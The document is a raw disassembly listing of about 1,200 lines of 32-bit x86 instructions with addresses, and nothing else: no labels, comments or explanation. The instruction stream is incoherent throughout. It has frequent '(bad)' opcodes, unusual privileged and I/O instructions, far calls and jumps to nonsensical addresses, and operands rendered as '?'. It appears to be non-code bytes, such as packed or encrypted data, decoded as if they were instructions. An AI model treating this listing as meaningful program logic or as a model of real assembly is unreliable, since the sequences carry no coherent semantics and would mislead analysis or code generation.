  420cb1:	push   esi
  420cb2:	sbb    ebx,DWORD PTR [edi-0x54b2e780]
  420cb8:	mov    ebp,0x8b9c7942
  420cbd:	xor    ecx,esp
  420cbf:	aam    0x24
  420cc1:	cmp    DWORD PTR [ecx],ecx
  420cc3:	fimul  DWORD PTR [ebx-0x54]
  420cc6:	dec    edx
  420cc7:	loope  0x420c73
  420cc9:	test   al,0x8a
  420ccb:	ja     0x420c98
  420ccd:	push   dx
  420ccf:	adc    al,0x81
  420cd1:	mov    bl,0x87
  420cd3:	sar    DWORD PTR [edx-0x789ce051],cl
  420cd9:	push   ss
  420cda:	sub    DWORD PTR [ecx],edx
  420cdc:	cwde   
  420cdd:	aas    
  420cde:	and    BYTE PTR [edi-0xd],dl
  420ce1:	mov    ebx,0x55a3e58c
  420ce6:	mov    ah,0xf8
  420ce8:	xchg   ecx,eax
  420ce9:	stos   BYTE PTR es:[edi],al
  420cea:	dec    esp
  420ceb:	xchg   edi,eax
  420cec:	jns    0x420d51
  420cee:	cmp    edi,DWORD PTR [ecx+0x3fc64c64]
  420cf4:	arpl   WORD PTR [edx+0x4],cx
  420cf7:	loop   0x420d2e
  420cf9:	add    BYTE PTR [eax+0xc63ed06],ah
  420cff:	test   eax,0xc6f80890
  420d04:	adc    DWORD PTR [edx+0x63],esi
  420d07:	call   0xdc5246
  420d0c:	push   edx
  420d0d:	jb     0x420ccd
  420d0f:	mov    ah,0x70
  420d11:	aam    0xe2
  420d13:	inc    ebp
  420d14:	sub    ebx,DWORD PTR [esi-0x6016eb05]
  420d1a:	es cmc 
  420d1c:	add    DWORD PTR [ebx],edx
  420d1e:	loop   0x420ca6
  420d20:	jmp    0x91826890
  420d25:	sahf   
  420d26:	dec    ebp
  420d27:	into   
  420d28:	cmp    DWORD PTR [esi],edi
  420d2a:	push   ebx
  420d2b:	cmp    dh,BYTE PTR [edi]
  420d2d:	inc    esp
  420d2e:	int    0x68
  420d30:	rcr    DWORD PTR [edi+0x5ff5398d],cl
  420d36:	or     esi,DWORD PTR [eax-0x217d9a1f]
  420d3c:	mov    al,ds:0xb45c4485
  420d41:	pop    ds
  420d42:	ret    0xc566
  420d45:	inc    esi
  420d46:	and    DWORD PTR [edi-0x4c3d3697],ebx
  420d4c:	push   edx
  420d4d:	xor    eax,0xc79e2296
  420d52:	loopne 0x420cf5
  420d54:	sbb    edi,DWORD PTR [eax+0x4e]
  420d57:	pushf  
  420d58:	sbb    bh,dh
  420d5a:	xchg   ebp,eax
  420d5b:	aad    0x98
  420d5d:	push   ebx
  420d5e:	sbb    eax,0xda221822
  420d63:	cld    
  420d64:	lock mov WORD PTR [edi-0x70],fs
  420d68:	pop    edx
  420d69:	dec    esi
  420d6a:	popf   
  420d6b:	out    dx,eax
  420d6c:	mov    ds:0xbf31eef6,al
  420d71:	aam    0x96
  420d73:	enter  0x50c6,0x36
  420d77:	aaa    
  420d78:	imul   ebp,DWORD PTR [ebx-0x5],0x31046d13
  420d7f:	arpl   WORD PTR [esi+esi*4],bp
  420d82:	inc    ecx
  420d83:	mov    al,0x41
  420d85:	sub    BYTE PTR [ecx+0x4],bh
  420d88:	jo     0x420de1
  420d8a:	test   DWORD PTR [ebp-0xd8283e7],eax
  420d90:	xchg   BYTE PTR [ecx-0x4a],cl
  420d93:	pop    ebx
  420d94:	js     0x420db2
  420d96:	mov    dl,0x70
  420d98:	mov    ebp,0x9d4e82a5
  420d9d:	xchg   ebx,eax
  420d9e:	daa    
  420d9f:	inc    ebp
  420da0:	push   cs
  420da1:	add    DWORD PTR [edi+0x320dd538],ebp
  420da7:	jmp    0x420e1d
  420da9:	cmc    
  420daa:	jae    0x420e19
  420dac:	(bad)  
  420dad:	adc    BYTE PTR [eax],dh
  420daf:	sbb    BYTE PTR [edx-0x64eac9d],ah
  420db5:	mov    WORD PTR [ecx-0x73f088a5],gs
  420dbb:	adc    eax,0x60ded5d4
  420dc0:	cmp    DWORD PTR [ebx],0xffffffca
  420dc3:	cmp    DWORD PTR [edx+0x3c6c2a27],ebp
  420dc9:	call   DWORD PTR [esi]
  420dcb:	shr    edx,cl
  420dcd:	or     eax,0xd73a0f68
  420dd2:	fild   WORD PTR [edi]
  420dd4:	pop    esp
  420dd5:	jge    0x420d57
  420dd7:	dec    eax
  420dd8:	daa    
  420dd9:	xor    ebp,DWORD PTR [edi]
  420ddb:	call   0xa1c7:0xe147ec17
  420de2:	pop    ebx
  420de3:	mov    dl,0xb8
  420de5:	push   ds
  420de6:	fidivr WORD PTR [eax]
  420de8:	dec    BYTE PTR [ecx+0x61125147]
  420dee:	mov    ecx,DWORD PTR [esi-0x4b]
  420df1:	fisttp QWORD PTR [edi]
  420df3:	mov    ch,0x58
  420df5:	dec    esi
  420df6:	sar    DWORD PTR [edi+eax*8+0x5f],0xb2
  420dfb:	pop    esp
  420dfc:	push   eax
  420dfd:	xor    eax,0xba7b252d
  420e02:	cli    
  420e03:	loope  0x420da4
  420e05:	lods   eax,DWORD PTR ds:[esi]
  420e06:	shr    ebx,1
  420e08:	push   eax
  420e09:	pop    ebx
  420e0b:	and    BYTE PTR [ecx],ch
  420e0d:	out    0xed,eax
  420e0f:	inc    esi
  420e10:	cmp    al,0x5b
  420e12:	aas    
  420e13:	aaa    
  420e14:	int3   
  420e15:	cmp    BYTE PTR [eax-0x3fd07ce],dl
  420e1b:	sbb    ebx,DWORD PTR [edi-0x36]
  420e1e:	test   DWORD PTR [eax+0x7f],edx
  420e21:	dec    edx
  420e22:	cdq    
  420e23:	jle    0x420e6b
  420e25:	stos   BYTE PTR es:[edi],al
  420e26:	mov    bh,0xce
  420e28:	xchg   ecx,eax
  420e2a:	and    dl,BYTE PTR [edi-0x13275470]
  420e30:	scas   eax,DWORD PTR es:[edi]
  420e31:	test   BYTE PTR [ebp-0x7dc93413],dh
  420e37:	push   esp
  420e38:	inc    esi
  420e39:	out    0x70,al
  420e3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e3c:	xor    al,0xc8
  420e3e:	pop    es
  420e3f:	mov    al,0x63
  420e41:	ins    DWORD PTR es:[edi],dx
  420e42:	pop    ebx
  420e43:	add    ebx,DWORD PTR [eax+0x3a]
  420e46:	stc    
  420e47:	(bad)  
  420e48:	or     al,0xc3
  420e4a:	call   0xb9b3:0x1b9d2b2b
  420e51:	sahf   
  420e52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e53:	loopne 0x420e1c
  420e55:	scas   eax,DWORD PTR es:[edi]
  420e56:	mov    ebx,0x3949fc07
  420e5b:	mov    dh,0x22
  420e5d:	leave  
  420e5e:	or     BYTE PTR [ecx+eax*8+0x39b93793],al
  420e65:	jp     0x420eb9
  420e67:	jg     0x420e3d
  420e69:	push   ds
  420e6a:	(bad)  
  420e6b:	pop    ss
  420e6c:	mov    cl,0x55
  420e6e:	add    al,0xc8
  420e70:	mov    esi,DWORD PTR [ebp-0x43]
  420e73:	sbb    bh,BYTE PTR [esi+0x1a]
  420e76:	jge    0x420e89
  420e78:	std    
  420e79:	mov    eax,ds:0xdf5461aa
  420e7e:	xchg   edi,eax
  420e7f:	imul   edx,DWORD PTR [esi-0x7389379],0x296063d3
  420e89:	pop    ebx
  420e8a:	adc    DWORD PTR ds:0xb18409bd,esp
  420e90:	dec    eax
  420e91:	push   ebx
  420e92:	push   edx
  420e93:	adc    eax,0xfa44cb8a
  420e98:	lods   eax,DWORD PTR ds:[esi]
  420e99:	icebp  
  420e9a:	(bad)  [ecx]
  420e9c:	ins    BYTE PTR es:[edi],dx
  420e9d:	mov    edi,fs
  420e9f:	xor    cl,0xe6
  420ea2:	sbb    BYTE PTR [esi],bl
  420ea4:	(bad)  
  420ea5:	(bad)  
  420ea6:	sbb    ecx,edx
  420ea8:	push   es
  420ea9:	pop    edx
  420eaa:	rcr    edx,1
  420eac:	pop    DWORD PTR [ecx]
  420eae:	rcr    BYTE PTR [edx-0x2d],cl
  420eb1:	mov    di,WORD PTR [eax-0x7f]
  420eb5:	pop    ds
  420eb6:	push   ebp
  420eb7:	jle    0x420e71
  420eb9:	fbstp  TBYTE PTR [ecx+0x315acb5]
  420ebf:	push   ecx
  420ec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ec1:	push   ss
  420ec2:	lea    ebp,[ebp-0x79]
  420ec5:	cmp    BYTE PTR [ecx],al
  420ec7:	dec    ebp
  420ec8:	imul   ecx,ebx,0x5ab5a5b1
  420ece:	inc    edi
  420ecf:	mov    esi,DWORD PTR [eax-0x1018fc76]
  420ed5:	lods   eax,DWORD PTR ds:[esi]
  420ed6:	stc    
  420ed7:	sbb    cl,BYTE PTR [ecx+0x802fa7e]
  420edd:	pop    esi
  420ede:	bswap  edi
  420ee0:	jge    0x420ed6
  420ee2:	fnstsw WORD PTR [ebx]
  420ee4:	sub    dl,dl
  420ee6:	sbb    eax,0x23625933
  420eeb:	mov    ebp,esi
  420eed:	push   ecx
  420eee:	js     0x420f13
  420ef0:	sub    edi,DWORD PTR [edx]
  420ef2:	loopne 0x420f12
  420ef4:	lahf   
  420ef5:	mov    ds:0xe612b8d0,eax
  420efa:	cld    
  420efb:	dec    esi
  420efc:	dec    edi
  420efd:	mov    eax,0x818b88e2
  420f02:	sti    
  420f03:	mov    ds:0x134fe2cb,al
  420f08:	mov    esi,0xd71f0e4b
  420f0d:	push   ss
  420f0e:	out    dx,eax
  420f0f:	pop    es
  420f10:	and    bh,cl
  420f12:	(bad)  
  420f14:	mul    BYTE PTR [esp+eax*4+0x60a5b468]
  420f1b:	inc    ebp
  420f1c:	jo     0x420eb0
  420f1e:	add    ch,cl
  420f20:	lock inc ebx
  420f22:	adc    bh,BYTE PTR [edi+0x8]
  420f25:	retf   0x5a75
  420f28:	add    eax,0x437f7400
  420f2d:	loope  0x420ef7
  420f2f:	fxch   st(7)
  420f31:	loop   0x420ec9
  420f33:	push   ss
  420f34:	fs mov edi,0xf8c12231
  420f3a:	jb     0x420f62
  420f3c:	pop    ds
  420f3d:	test   al,0xb0
  420f3f:	sub    DWORD PTR [esi-0x13],edi
  420f42:	or     ebp,DWORD PTR [ebp-0x7cc64c49]
  420f48:	push   eax
  420f49:	lds    eax,FWORD PTR [edx]
  420f4b:	xchg   bh,bl
  420f4d:	xchg   edi,eax
  420f4e:	into   
  420f4f:	(bad)  
  420f50:	fcomp  st(1)
  420f52:	popf   
  420f53:	sbb    ebp,DWORD PTR [edx+ebx*1+0x9cdb47d]
  420f5a:	pop    ebp
  420f5b:	dec    ebx
  420f5c:	push   ebp
  420f5d:	ja     0x420fab
  420f5f:	pushf  
  420f60:	(bad)  
  420f63:	(bad)  
  420f64:	test   esp,0x893f3cc8
  420f6a:	scas   al,BYTE PTR es:[edi]
  420f6b:	dec    esi
  420f6c:	stos   BYTE PTR es:[edi],al
  420f6d:	add    DWORD PTR [ecx*1-0x1629b727],ebx
  420f74:	pop    eax
  420f75:	es pop edx
  420f77:	push   ebp
  420f78:	add    esi,DWORD PTR [eax-0x3ec4073a]
  420f7e:	and    al,0x7b
  420f80:	mov    edx,0xf8e8ed36
  420f85:	out    dx,al
  420f86:	add    eax,0x4f8e3031
  420f8b:	mov    esi,0x184a652
  420f90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f91:	inc    ecx
  420f92:	lods   al,BYTE PTR ds:[esi]
  420f93:	fdiv   DWORD PTR [edi+0xa7425a3]
  420f99:	sub    eax,0x8a72c547
  420f9e:	outs   dx,DWORD PTR ds:[esi]
  420f9f:	and    al,0xec
  420fa1:	es dec esp
  420fa3:	cmp    DWORD PTR [esi+0x17],eax
  420fa6:	dec    ecx
  420fa7:	test   al,0x94
  420fa9:	sbb    ah,al
  420fab:	stos   DWORD PTR es:[edi],eax
  420fac:	les    ecx,FWORD PTR [edi+0x7281b341]
  420fb2:	loop   0x420fe8
  420fb4:	or     dl,BYTE PTR [ebx]
  420fb6:	push   ebp
  420fb7:	jmp    edx
  420fb9:	stc    
  420fba:	push   0xa6e8a842
  420fbf:	xchg   DWORD PTR [ebx+0x5b],edi
  420fc2:	lods   al,BYTE PTR ds:[esi]
  420fc3:	jbe    0x42103d
  420fc5:	or     eax,0xd1683b63
  420fca:	imul   BYTE PTR [ecx-0x10f3a693]
  420fd0:	xor    al,0xd9
  420fd2:	push   es
  420fd3:	jecxz  0x421021
  420fd5:	sub    BYTE PTR [eax-0x40],0x4c
  420fd9:	jae    0x420f9c
  420fdb:	imul   eax,edi,0x7a1c41f0
  420fe1:	daa    
  420fe2:	add    bh,BYTE PTR [edi+edx*2]
  420fe5:	push   es
  420fe6:	aas    
  420fe7:	mov    bl,BYTE PTR [ecx]
  420fe9:	add    al,0x2
  420feb:	mov    edi,0x7e319e7f
  420ff0:	inc    ecx
  420ff1:	pop    esp
  420ff2:	jno    0x42101d
  420ff4:	lock and al,ah
  420ff7:	jecxz  0x421063
  420ff9:	ss or  al,0x97
  420ffc:	sbb    ebx,DWORD PTR [ecx+0x6]
  420fff:	add    esp,DWORD PTR [ebp+0x791af908]
  421005:	stos   BYTE PTR es:[edi],al
  421006:	push   ebx
  421007:	sar    BYTE PTR [eax],0x6
  42100a:	xchg   esi,eax
  42100b:	lock fimul DWORD PTR [ecx]
  42100e:	sbb    ah,BYTE PTR ds:0x77d60856
  421014:	ins    DWORD PTR es:[edi],dx
  421015:	into   
  421016:	cmp    al,BYTE PTR [eax+0xf]
  421019:	in     eax,dx
  42101a:	dec    ecx
  42101b:	out    0x22,eax
  42101d:	pop    esi
  42101e:	outs   dx,DWORD PTR ds:[esi]
  42101f:	out    0x4e,eax
  421021:	es ins BYTE PTR es:[edi],dx
  421023:	cmp    esi,DWORD PTR [eax+0x366a117c]
  421029:	add    DWORD PTR [edi+0x71],eax
  42102c:	test   BYTE PTR [ecx],al
  42102e:	jmp    0x42103b
  421030:	icebp  
  421031:	cwde   
  421032:	mov    ds:0x4fb804ac,eax
  421037:	inc    eax
  421038:	jl     0x420ffa
  42103a:	inc    ebp
  42103b:	cmp    DWORD PTR [ecx+edx*4+0x49cc225b],esp
  421042:	rcl    BYTE PTR [ecx+0xb],1
  421045:	cdq    
  421046:	mov    ds:0x70496ac8,eax
  42104b:	sub    DWORD PTR [edi-0x41],0x7055566e
  421052:	xchg   ebp,eax
  421053:	add    ecx,DWORD PTR [esi+0x7a9210da]
  421059:	js     0x421035
  42105b:	ficomp WORD PTR [esi]
  42105d:	or     DWORD PTR [ebp-0x505ac52],0xffffffcb
  421064:	cmp    DWORD PTR [ebp+0x25],ebx
  421067:	(bad)  
  421068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421069:	(bad)  
  42106a:	ficomp WORD PTR [esi]
  42106c:	ds push esp
  42106e:	xchg   ecx,eax
  42106f:	aaa    
  421070:	ret    
  421071:	stos   DWORD PTR es:[edi],eax
  421072:	push   0x6f3c58
  421077:	cwde   
  421078:	adc    esp,DWORD PTR [ebp-0x59d35adc]
  42107e:	mov    bh,0x97
  421081:	mov    ecx,0x1b317a85
  421086:	(bad)  
  421087:	adc    DWORD PTR [ebx-0xb],ebp
  42108a:	pusha  
  42108b:	sub    esi,DWORD PTR [esi+0x78]
  42108e:	sbb    al,0x2
  421090:	dec    ebx
  421091:	dec    ebx
  421092:	mov    esp,0x14232ec
  421097:	fadd   st,st(3)
  421099:	addr16 pop ss
  42109b:	fcmovbe st,st(4)
  42109d:	and    eax,0x56da9599
  4210a2:	or     DWORD PTR [ecx+0x1d],esi
  4210a5:	aaa    
  4210a6:	sub    esi,eax
  4210a8:	es jns 0x421095
  4210ab:	bound  ebp,QWORD PTR [esi+0x10a80827]
  4210b1:	test   al,0xf
  4210b3:	jbe    0x4210fb
  4210b5:	cs retf 
  4210b7:	les    edx,FWORD PTR [eax]
  4210b9:	ret    
  4210ba:	or     al,BYTE PTR ds:0xe938e48e
  4210c0:	sete   dh
  4210c3:	stos   DWORD PTR es:[edi],eax
  4210c4:	shr    bh,cl
  4210c6:	sub    BYTE PTR [ebx+0x5d87e375],ah
  4210cc:	push   DWORD PTR [edi-0x2]
  4210cf:	pop    ebx
  4210d0:	inc    ecx
  4210d1:	js     0x4210d5
  4210d3:	jg     0x42113d
  4210d5:	lods   al,BYTE PTR ds:[esi]
  4210d6:	mov    DWORD PTR [edx],esi
  4210d8:	ss aad 0xd9
  4210db:	xor    al,0xd
  4210dd:	inc    ebx
  4210de:	ror    BYTE PTR [eax],0x99
  4210e1:	push   ss
  4210e2:	pop    eax
  4210e3:	mov    dl,0x64
  4210e5:	mov    ecx,DWORD PTR [ebx-0x7]
  4210e8:	stos   DWORD PTR es:[edi],eax
  4210e9:	popf   
  4210ea:	pop    ebx
  4210eb:	ret    
  4210ec:	in     al,dx
  4210ed:	pop    es
  4210ee:	mov    ah,0xca
  4210f0:	inc    ebp
  4210f1:	mov    eax,0x5bfcbc30
  4210f6:	outs   dx,DWORD PTR ds:[esi]
  4210f7:	push   esi
  4210f8:	xchg   ebx,eax
  4210f9:	lock lock ror BYTE PTR [edx],1
  4210fd:	inc    ebp
  4210fe:	ins    BYTE PTR es:[edi],dx
  4210ff:	xor    eax,0xb770f68
  421104:	scas   al,BYTE PTR es:[edi]
  421105:	jp     0x421161
  421107:	ret    0x540f
  42110a:	sbb    al,0x8d
  42110c:	out    0x9e,eax
  42110e:	jnp    0x42118c
  421110:	dec    eax
  421111:	xchg   ebp,eax
  421112:	xor    eax,0x2b7eada0
  421117:	cwde   
  421118:	pop    esp
  421119:	adc    eax,0x44bfd83f
  42111e:	jl     0x421131
  421120:	icebp  
  421121:	sub    DWORD PTR [ebx+eax*2-0x4ee71736],edi
  421128:	xor    DWORD PTR [eax-0x57],ebx
  42112b:	popf   
  42112c:	add    al,0x96
  42112e:	loop   0x4211a8
  421130:	rcr    DWORD PTR [esi+0x9],1
  421133:	mov    edx,0x970928e7
  421138:	sbb    BYTE PTR [eax],0x6f
  42113b:	mul    DWORD PTR [eax-0x40]
  42113e:	test   cl,ch
  421140:	aas    
  421141:	xchg   di,dx
  421144:	mov    dl,0x37
  421146:	int3   
  421147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421148:	jecxz  0x4210e1
  42114a:	and    al,0x49
  42114c:	and    BYTE PTR [edx-0x11ff075e],dh
  421152:	push   esi
  421153:	jnp    0x421142
  421155:	pop    esp
  421156:	or     ah,bh
  421158:	pop    es
  421159:	pusha  
  42115a:	mov    dl,0x14
  42115c:	adc    DWORD PTR [ebx+ebp*1-0x56b7850],ebx
  421163:	xor    DWORD PTR [ebp+0x449c1a82],0x1195ea0c
  42116d:	das    
  42116e:	jg     0x421183
  421170:	mov    WORD PTR ds:0x51c3cf46,ds
  421176:	dec    edi
  421177:	rol    DWORD PTR [esi],cl
  421179:	xor    BYTE PTR [edi+0x46926fad],al
  42117f:	cli    
  421180:	(bad)  
  421181:	(bad)  [esi+0x5a]
  421184:	mov    ebp,esi
  421186:	jge    0x42114e
  421188:	sbb    eax,0x47e1f088
  42118d:	jge    0x421143
  42118f:	into   
  421190:	mov    ecx,0x897debad
  421195:	xlat   BYTE PTR ds:[ebx]
  421196:	mov    bh,0x83
  421198:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421199:	out    0x12,eax
  42119b:	xor    al,0x30
  42119d:	inc    edx
  42119e:	push   0x69c2f77f
  4211a3:	jle    0x421133
  4211a5:	dec    eax
  4211a6:	stos   DWORD PTR es:[edi],eax
  4211a7:	cli    
  4211a8:	push   ds
  4211a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211aa:	retf   0x5d4b
  4211ad:	test   DWORD PTR [ecx],ebx
  4211af:	sbb    ebx,DWORD PTR ds:0x1eaa3a2b
  4211b5:	inc    edi
  4211b6:	cli    
  4211b7:	push   0x3c
  4211b9:	inc    edx
  4211ba:	cmp    ch,BYTE PTR [ebx-0x2e]
  4211bd:	jg     0x42119f
  4211bf:	(bad)  
  4211c0:	fs test eax,0x84bcbbf1
  4211c6:	aam    0xdd
  4211c8:	jl     0x42120b
  4211ca:	mov    BYTE PTR [esi-0x5d],cl
  4211cd:	xchg   ecx,eax
  4211ce:	mov    BYTE PTR [ebp-0x3494b5f9],dl
  4211d4:	nop
  4211d5:	push   ebx
  4211d6:	pop    edi
  4211d7:	loopne 0x4211a9
  4211d9:	inc    edi
  4211da:	jnp    0x421167
  4211dc:	mov    eax,0x90cac2b8
  4211e1:	adc    dh,ch
  4211e3:	pop    edx
  4211e4:	jg     0x421221
  4211e6:	jg     0x42121e
  4211e8:	int    0x2
  4211ea:	xchg   ebp,eax
  4211eb:	mov    ch,0xfe
  4211ed:	xor    edi,esi
  4211ef:	fisubr DWORD PTR [ecx+edx*4-0x1c946114]
  4211f6:	and    eax,0xd1c62c4f
  4211fb:	mov    dh,0x29
  4211fd:	test   al,0x9b
  4211ff:	daa    
  421200:	and    al,0x51
  421202:	xor    eax,0xfc0b5c3f
  421207:	and    al,0x43
  421209:	ins    DWORD PTR es:[edi],dx
  42120a:	dec    esp
  42120b:	sti    
  42120c:	ret    0x6d6d
  42120f:	push   edi
  421210:	inc    eax
  421211:	addr16 call 0xf0893fbe
  421217:	das    
  421218:	sub    DWORD PTR [ebx],ebp
  42121a:	or     eax,0x783ac6c0
  42121f:	push   esi
  421220:	adc    esi,DWORD PTR [edx+0x4afb1b91]
  421226:	into   
  421227:	jl     0x4212a8
  421229:	fcom   DWORD PTR [ecx]
  42122b:	jns    0x421265
  42122d:	jle    0x42126d
  42122f:	mov    edx,0x79cb3369
  421234:	mov    bl,0xb8
  421236:	enter  0xf1d9,0x6f
  42123a:	push   ebx
  42123b:	pop    ss
  42123c:	pop    edi
  42123d:	mov    esi,0x77e13108
  421242:	xchg   BYTE PTR [eax-0x72],dl
  421245:	jecxz  0x4212b2
  421247:	cli    
  421248:	jne    0x4211cf
  42124a:	stos   BYTE PTR es:[edi],al
  42124b:	test   BYTE PTR [esi-0x6d80770c],bh
  421251:	push   0x45
  421253:	ret    0x7c8b
  421256:	sub    al,0x21
  421258:	popa   
  421259:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42125a:	icebp  
  42125b:	mov    esi,DWORD PTR [edi-0x17594575]
  421261:	sbb    BYTE PTR [ebx+0x18f1b769],dh
  421267:	fidivr DWORD PTR [bp+di+0x78]
  42126b:	ss inc ebp
  42126d:	add    dl,BYTE PTR [ebx]
  42126f:	enter  0x56ed,0x5f
  421273:	mov    eax,0x4d616178
  421278:	push   ebx
  421279:	gs dec ebx
  42127b:	and    al,0x22
  42127d:	mov    ecx,0x1ea01146
  421282:	cld    
  421283:	push   esp
  421284:	clc    
  421285:	push   ds
  421286:	add    al,0xa4
  421288:	leave  
  421289:	fisubr DWORD PTR [ecx-0x8]
  42128c:	mov    cl,0x7b
  42128e:	mov    BYTE PTR [edx+ecx*4],al
  421291:	mov    dh,0x19
  421293:	in     al,0xa1
  421295:	mov    esp,0xd0ca5447
  42129a:	ret    
  42129b:	and    al,0x6b
  42129d:	jo     0x4212f7
  42129f:	outs   dx,DWORD PTR ds:[esi]
  4212a0:	push   ecx
  4212a1:	xchg   esi,eax
  4212a2:	inc    ebp
  4212a3:	hlt    
  4212a4:	adc    eax,0x341cc8c6
  4212a9:	stc    
  4212aa:	out    dx,eax
  4212ab:	xor    DWORD PTR [eax+0x35507f00],edx
  4212b1:	pop    edi
  4212b2:	jge    0x4212a4
  4212b4:	jns    0x42123a
  4212b6:	ror    BYTE PTR [ebp+0x60a8c8a0],0x4d
  4212bd:	cli    
  4212be:	jge    0x421244
  4212c0:	mov    ebp,DWORD PTR [ecx]
  4212c2:	rol    DWORD PTR [ebx+0x4ac0527],cl
  4212c8:	jae    0x421262
  4212ca:	icebp  
  4212cb:	sub    al,ch
  4212cd:	retf   
  4212ce:	add    esi,DWORD PTR [ecx+0x6a]
  4212d1:	loop   0x4212e0
  4212d3:	jno    0x4212b4
  4212d5:	enter  0x379c,0x87
  4212d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212da:	cmp    cl,BYTE PTR [edi-0x4a]
  4212dd:	ss ud2 
  4212e0:	jmp    0x42128b
  4212e2:	enter  0xb7d7,0xb7
  4212e6:	loopne 0x4212a6
  4212e8:	test   eax,0x40f0a47e
  4212ed:	and    DWORD PTR [ecx-0x36717e03],0xffffffec
  4212f4:	pop    es
  4212f5:	call   0x3de2e63e
  4212fa:	(bad)  
  4212fb:	xor    al,0x3
  4212fd:	push   0xffffff81
  4212ff:	not    BYTE PTR [ecx+0x5d349641]
  421305:	loope  0x421376
  421307:	sub    bl,al
  421309:	stos   DWORD PTR es:[edi],eax
  42130a:	fbstp  TBYTE PTR [ebx+eiz*2]
  42130d:	scas   eax,DWORD PTR es:[edi]
  42130e:	ds cwde 
  421310:	fld    QWORD PTR ds:0xfb8012af
  421316:	pop    eax
  421317:	pmullw mm1,mm2
  42131a:	jo     0x4212b5
  42131c:	and    eax,0x8000b048
  421321:	loop   0x42138a
  421323:	cmc    
  421324:	cwde   
  421325:	xor    ecx,DWORD PTR [esi]
  421327:	mov    ebp,0xc4388cf8
  42132c:	test   al,0xb7
  42132e:	mov    WORD PTR [ecx+0x78],?
  421331:	pop    ebx
  421332:	push   ebx
  421333:	pop    eax
  421334:	mov    es,WORD PTR [ecx-0x12]
  421337:	das    
  421338:	loop   0x421300
  42133a:	into   
  42133b:	sbb    eax,0x9f40baa1
  421340:	mov    ds:0x1e605bcc,al
  421345:	lahf   
  421346:	pushf  
  421347:	std    
  421348:	test   BYTE PTR [eax],0xa0
  42134b:	cmc    
  42134c:	inc    ecx
  42134d:	in     eax,dx
  42134e:	aaa    
  42134f:	icebp  
  421350:	add    ah,ch
  421352:	aas    
  421353:	xor    dl,BYTE PTR [edi+0x43a896ee]
  421359:	(bad)  
  42135a:	cmp    DWORD PTR [edi+0x38],eax
  42135d:	faddp  st(7),st
  42135f:	and    al,0x91
  421361:	jge    0x4213c0
  421363:	xor    eax,0x91d38c63
  421368:	adc    eax,0xd42c0648
  42136d:	pop    es
  42136e:	and    DWORD PTR [ebp+0x730de5ab],edi
  421374:	pop    es
  421375:	jmp    0x4212ff
  421377:	mov    al,ds:0x4e75059
  42137c:	pop    edi
  42137d:	adc    ebx,DWORD PTR [esi-0x447c32ae]
  421383:	mov    ds:0x35d0a5fd,al
  421388:	or     ebp,DWORD PTR [edx+0x1b]
  42138b:	int3   
  42138c:	mov    ebx,0xe7b8e93b
  421391:	outs   dx,BYTE PTR ds:[esi]
  421392:	mul    DWORD PTR cs:[ecx-0x42]
  421396:	sbb    eax,DWORD PTR [ebx+ecx*1-0x9a4e6e6]
  42139d:	fmul   st,st(5)
  42139f:	pop    esi
  4213a0:	and    ebx,ecx
  4213a2:	clc    
  4213a3:	cld    
  4213a4:	push   cs
  4213a5:	stc    
  4213a6:	stc    
  4213a7:	xor    ebx,DWORD PTR [ecx+0x3a]
  4213aa:	jge    0x4213ec
  4213ac:	or     al,0x2e
  4213ae:	pop    ebx
  4213af:	pop    ss
  4213b0:	ret    0x2633
  4213b3:	jmp    0xfb4be4e4
  4213b8:	pop    ss
  4213b9:	jns    0x4213a6
  4213bb:	iret   
  4213bc:	push   ebx
  4213bd:	fcom   QWORD PTR [edi]
  4213bf:	test   DWORD PTR [edx],0xb286b9db
  4213c5:	add    dl,BYTE PTR [ecx]
  4213c7:	iret   
  4213c8:	xor    eax,0x168f8d9e
  4213cd:	jb     0x4213b0
  4213cf:	jnp    0x4213ba
  4213d1:	pop    edx
  4213d2:	and    al,0x64
  4213d4:	mov    ds:0xa31834ad,eax
  4213d9:	jae    0x42142c
  4213db:	sub    BYTE PTR ds:0x4de042b9,cl
  4213e1:	loop   0x4213e8
  4213e3:	push   eax
  4213e4:	mov    dl,BYTE PTR [ecx+0x20]
  4213e7:	retf   
  4213e8:	xor    BYTE PTR [esp+ecx*2+0x45],0xc3
  4213ed:	xlat   BYTE PTR ds:[ebx]
  4213ee:	inc    ebp
  4213ef:	in     al,dx
  4213f0:	ds sub al,0x84
  4213f3:	sbb    DWORD PTR [esi+0x2ef277ec],eax
  4213f9:	xchg   esp,eax
  4213fa:	into   
  4213fb:	xchg   ecx,eax
  4213fc:	cwde   
  4213fd:	push   esi
  4213fe:	fcmovne st,st(2)
  421400:	fwait
  421401:	and    dh,BYTE PTR [eax]
  421403:	pop    edx
  421404:	fcomip st,st(7)
  421406:	jmp    0xa7636638
  42140b:	add    ah,dh
  42140d:	(bad)  
  42140e:	xchg   edi,eax
  42140f:	pop    ecx
  421410:	xchg   ecx,eax
  421411:	push   esp
  421412:	xor    eax,0x9c381170
  421417:	sahf   
  421418:	mov    dh,0x5b
  42141a:	test   ah,ch
  42141c:	and    bl,BYTE PTR [ecx-0x5220d7b5]
  421422:	or     edx,DWORD PTR [esi-0x6b077ed5]
  421428:	pop    esi
  421429:	jmp    0x4213e2
  42142b:	xor    BYTE PTR ds:0x99d16633,al
  421431:	push   ebp
  421432:	mov    dh,0x31
  421434:	adc    eax,0x39faa92f
  421439:	sub    al,0xb7
  42143b:	ins    BYTE PTR es:[edi],dx
  42143c:	sub    BYTE PTR [esi],cl
  42143e:	sahf   
  42143f:	cmp    esp,esp
  421441:	popa   
  421442:	sbb    al,0x3d
  421444:	xchg   esp,eax
  421445:	adc    edx,DWORD PTR [esi+0x77]
  421448:	out    dx,eax
  421449:	add    DWORD PTR ds:[edi+0x655d1cb2],0xede871a1
  421454:	mov    ?,WORD PTR [ebp-0x6a026024]
  42145a:	fld    QWORD PTR [esi+0x34]
  42145d:	sahf   
  42145e:	dec    ebx
  42145f:	inc    edi
  421460:	inc    edx
  421461:	das    
  421462:	inc    ebp
